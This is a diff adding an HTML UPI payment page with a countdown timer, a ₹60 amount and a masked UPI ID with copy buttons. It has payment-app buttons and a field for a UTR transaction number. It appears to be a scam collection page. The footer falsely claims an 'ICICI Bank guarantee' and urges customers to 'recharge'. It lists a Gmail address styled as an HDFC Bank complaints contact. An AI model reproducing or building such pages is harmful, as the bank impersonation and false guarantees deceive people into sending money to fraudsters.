@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment Page</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+    <div class="timer" id="timer">08:20</div>
+
+    <div class="amount">
+        Amount: ₹60 
+        <button class="copy-btn" onclick="copyText('60')">COPY</button>
+    </div>
+
+    <div class="upi">
+        VPA/UPI: dev@****@upi 
+        <button class="copy-btn" onclick="copyText('dev@upi')">COPY</button>
+    </div>
+    
+    <div class="notice">
+        <p>1. One UPI can only transfer money once.</p>
+        <p>2. Don't change the payment amount. Otherwise, the order cannot be closed.</p>
+    </div>
+    
+    <div class="payment-options">
+        <button onclick="selectPayment(this)">PhonePe</button>
+        <button onclick="selectPayment(this)">Paytm</button>
+        <button onclick="selectPayment(this)">Google Pay</button>
+        <button onclick="selectPayment(this)">UPI</button>
+    </div>
+    
+    <input type="text" class="utr-input" id="utrInput" placeholder="Input UTR number">
+    <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
+    
+    <div class="footer">
+        Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable!  
+        <br>
+        Contact: <a href="mailto:hdfcbankcomplaintacceptance@gmail.com">hdfcbankcomplaintacceptance@gmail.com</a>
+    </div>
+</div>
+<script src="script.js"></script>
+</body>
+</html>
